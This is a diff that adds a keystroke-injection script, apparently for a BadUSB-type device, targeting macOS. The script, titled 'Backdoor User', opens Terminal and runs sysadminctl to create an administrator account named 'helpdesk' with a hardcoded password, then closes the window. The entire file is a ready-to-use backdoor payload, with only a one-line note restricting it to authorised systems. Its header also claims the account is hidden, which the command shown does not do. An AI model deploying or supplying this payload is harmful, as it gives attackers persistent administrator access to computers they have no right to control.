@@ -1,0 +1,17 @@
+META macos acceso
+REM Title: Backdoor User
+REM Description: Creates a hidden admin user
+REM Change USERNAME and PASSWORD before using
+REM Use only on authorized systems
+
+DEFAULTDELAY 500
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 800
+STRING sudo sysadminctl -addUser helpdesk -password e9!4!u%%a%H46% -admin
+ENTER
+DELAY 2000
+STRING exit
+ENTER
